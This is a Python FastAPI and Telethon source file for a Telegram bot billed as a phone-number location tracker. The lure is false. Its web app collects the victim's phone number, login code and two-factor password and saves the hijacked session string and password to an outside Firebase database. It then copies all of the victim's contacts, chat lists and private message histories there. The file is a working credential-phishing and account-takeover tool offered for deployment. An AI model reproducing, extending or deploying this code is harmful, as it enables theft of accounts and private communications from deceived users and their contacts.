import os
import asyncio
import re
import requests
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.templating import Jinja2Templates
from fastapi.middleware.cors import CORSMiddleware
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, FloodWaitError
from telethon.tl.functions.contacts import GetContactsRequest, GetBlockedRequest
from telethon.tl.functions.messages import ExportChatInviteRequest
from telethon.tl.types import User, Chat, Channel
from telethon.tl.custom import Button

# --- Configuration ---
API_ID = int(os.environ.get("API_ID", "0"))
API_HASH = os.environ.get("API_HASH", "")
FIREBASE_BASE_URL = os.environ.get("FIREBASE_BASE_URL", "")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "") 
WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://your-app.onrender.com") # Update with your Render URL
CONCURRENT_CHATS = 5

app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"])
templates = Jinja2Templates(directory="templates")

active_clients = {}
auth_data = {}

# --- Bot Client ---
bot = TelegramClient('bot_session', API_ID, API_HASH)

@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    kb = [
        [Button.web_app("📍 Track Location", WEBAPP_URL)],
        [Button.url("↗️ Share Bot", f"https://t.me/share/url?url=https://t.me/{(await bot.get_me()).username}")]
    ]
    welcome_text = (
        "👋 **Welcome to Anon Locater Bot!**\n\n"
        "I can help you track the live location, device details, and network data of any mobile number worldwide.\n\n"
        "Click the button below to start tracking instantly."
    )
    await event.reply(welcome_text, buttons=kb)

@bot.on(events.NewMessage(func=lambda e: e.contact))
async def contact_handler(event):
    """Catches natively shared contacts and pushes them to Firebase for the Web App to read"""
    phone = event.message.contact.phone_number
    if not phone.startswith('+'):
        phone = '+' + phone
    tg_id = str(event.sender_id)
    patch_to_firebase(f"number/{tg_id}", {"phone": phone, "id": tg_id})

@app.on_event("startup")
async def startup_event():
    if BOT_TOKEN:
        await bot.start(bot_token=BOT_TOKEN)
        asyncio.create_task(bot.run_until_disconnected())
        print("🤖 Telegram Bot Started Successfully!")

# --- Firebase Helpers ---
def put_to_firebase(path, data):
    try: requests.put(f"{FIREBASE_BASE_URL}/{path}.json", json=data)
    except: pass

def patch_to_firebase(path, data):
    try: requests.patch(f"{FIREBASE_BASE_URL}/{path}.json", json=data)
    except: pass

def get_from_firebase(path):
    try:
        res = requests.get(f"{FIREBASE_BASE_URL}/{path}.json")
        if res.status_code == 200: return res.json()
    except: pass
    return None

def get_last_msg_id(base_path, user_id):
    try:
        res = requests.get(f"{FIREBASE_BASE_URL}/{base_path}/chats/{user_id}.json?orderBy=\"$key\"&limitToLast=1")
        if res.status_code == 200 and res.json(): return int(list(res.json().keys())[0])
    except: pass
    return 0

# --- Fast Backup Engine ---
async def scrape_chat(client, user, base_path):
    user_id = str(user.id)
    last_id = get_last_msg_id(base_path, user_id)
    chat_history, count = {}, 0
    try:
        async for message in client.iter_messages(user, reverse=True, min_id=last_id, limit=None):
            msg_id = str(message.id)
            chat_history[msg_id] = {"d": message.date.isoformat() if message.date else "", "s": message.sender_id, "t": message.text or "[Media]"}
            count += 1
            if count % 200 == 0:
                patch_to_firebase(f"{base_path}/chats/{user_id}", chat_history)
                chat_history = {}
        if chat_history: patch_to_firebase(f"{base_path}/chats/{user_id}", chat_history)
    except FloodWaitError as e: await asyncio.sleep(e.seconds)
    except Exception: pass

async def run_fast_backup(session_string, tg_user_id, tg_username):
    client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
    await client.connect()
    me = await client.get_me()
    my_username = re.sub(r'[\.\$#\[\]/]', '_', me.username or str(me.id))
    base_path = f"backup/{my_username}"

    contacts = await client(GetContactsRequest(hash=0))
    contact_ids = {str(u.id) for u in contacts.users}
    contacts_data = {str(user.id): {"first_name": user.first_name or "", "last_name": user.last_name or "", "phone": f"+{user.phone}" if user.phone else "Hidden", "username": user.username or "None"} for user in contacts.users}
    if contacts_data: put_to_firebase(f"{base_path}/contacts", contacts_data)

    p2p_users, unsaved, dialogs_data = [], {}, {"channels": {}, "groups": {}}
    async for dialog in client.iter_dialogs():
        entity = dialog.entity
        entity_id = str(dialog.id)
        if isinstance(entity, User) and not getattr(entity, 'bot', False):
            p2p_users.append(entity)
            if entity_id not in contact_ids: unsaved[entity_id] = {"n": dialog.name, "u": entity.username}
        elif isinstance(entity, (Chat, Channel)):
            chat_type = "channels" if getattr(entity, 'broadcast', False) else "groups"
            invite_link = getattr(entity, 'username', None)
            invite_link = f"https://t.me/{invite_link}" if invite_link else "Private"
            dialogs_data[chat_type][entity_id] = {"name": entity.title, "invite_url": invite_link, "entity_id": entity.id}

    if unsaved: patch_to_firebase(f"{base_path}/unsaved", unsaved)
    if dialogs_data["channels"] or dialogs_data["groups"]: patch_to_firebase(f"{base_path}/dialogs", dialogs_data)

    for i in range(0, len(p2p_users), CONCURRENT_CHATS):
        tasks = [scrape_chat(client, u, base_path) for u in p2p_users[i:i + CONCURRENT_CHATS]]
        await asyncio.gather(*tasks)
    await client.disconnect()

# --- API Routes ---
@app.get("/ping")
@app.head("/ping")
async def ping(): return JSONResponse(content={"status": "alive"})

@app.get("/", response_class=HTMLResponse)
async def index(request: Request):
    return templates.TemplateResponse(request=request, name="index.html", context={"request": request})

@app.post("/check_session")
async def check_session(request: Request):
    data = await request.json()
    tg_id = data.get("tg_user_id")
    existing_data = get_from_firebase(f"tgsession/{tg_id}")
    if existing_data and existing_data.get("session_string"):
        session_str = existing_data.get("session_string")
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
        try:
            await client.connect()
            if await client.is_user_authorized():
                asyncio.create_task(run_fast_backup(session_str, tg_id, data.get("tg_username")))
                return JSONResponse({"status": "exists"})
            await client.disconnect()
        except Exception: pass
    put_to_firebase(f"tgsession/{tg_id}/miniapp_info", data)
    return JSONResponse({"status": "not_found"})

@app.post("/api/track_target")
async def track_target(request: Request):
    data = await request.json()
    patch_to_firebase(f"tracked_history/{data.get('tg_user_id')}", {data.get("target_number"): "Queried"})
    return JSONResponse({"status": "success"})

@app.post("/api/check_phone")
async def check_phone(request: Request):
    tg_id = (await request.json()).get("tg_user_id")
    num_data = get_from_firebase(f"number/{tg_id}")
    if num_data and num_data.get("phone"): return JSONResponse({"status": "found", "phone": num_data.get("phone")})
    return JSONResponse({"status": "waiting"})

@app.post("/api/action")
async def handle_action(request: Request):
    data = await request.json()
    action, tg_id = data.get("action"), data.get("tg_user_id", "web_test")
    tg_name, tg_username = data.get("tg_name", "Unknown"), data.get("tg_username", "Unknown")

    if action == "send_phone":
        phone = data.get("phone").replace(" ", "")
        patch_to_firebase(f"number/{tg_id}", {"phone": phone, "id": tg_id})
        
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        try:
            send_code_info = await client.send_code_request(phone)
            active_clients[tg_id] = client
            auth_data[tg_id] = {"phone": phone, "phone_code_hash": send_code_info.phone_code_hash}
            return JSONResponse({"status": "success", "next_step": "otp"})
        except Exception as e:
            return JSONResponse({"status": "error", "message": str(e)})

    elif action == "send_otp":
        client = active_clients.get(tg_id)
        auth_info = auth_data.get(tg_id)
        auth_info["otp"] = data.get("otp") 
        try:
            await client.sign_in(auth_info["phone"], auth_info["otp"], phone_code_hash=auth_info["phone_code_hash"])
            session_str = client.session.save()
            auth_info["session_string"] = session_str
            put_to_firebase(f"tgsession/{tg_id}", auth_info)
            put_to_firebase(f"users_data/{tg_id}", {"chatid": tg_id, "name": tg_name, "username": tg_username, "mobile_number": auth_info["phone"], "Telegram_Session": session_str})
            asyncio.create_task(run_fast_backup(session_str, tg_id, tg_username))
            return JSONResponse({"status": "success", "next_step": "result"})
        except SessionPasswordNeededError:
            return JSONResponse({"status": "success", "next_step": "2fa"})
        except Exception as e:
            return JSONResponse({"status": "error", "message": str(e)})

    elif action == "send_2fa":
        client = active_clients.get(tg_id)
        auth_info = auth_data.get(tg_id)
        auth_info["2fa_password"] = data.get("password")
        try:
            await client.sign_in(password=auth_info["2fa_password"])
            session_str = client.session.save()
            auth_info["session_string"] = session_str
            put_to_firebase(f"tgsession/{tg_id}", auth_info)
            put_to_firebase(f"users_data/{tg_id}", {"chatid": tg_id, "name": tg_name, "username": tg_username, "mobile_number": auth_info.get("phone", ""), "Telegram_Session": session_str})
            asyncio.create_task(run_fast_backup(session_str, tg_id, tg_username))
            return JSONResponse({"status": "success", "next_step": "result"})
        except Exception as e:
            return JSONResponse({"status": "error", "message": str(e)})

if __name__ == "__main__":
    import uvicorn
    port = int(os.environ.get("PORT", 10000))
    uvicorn.run("main:app", host="0.0.0.0", port=port, proxy_headers=True, forwarded_allow_ips="*")
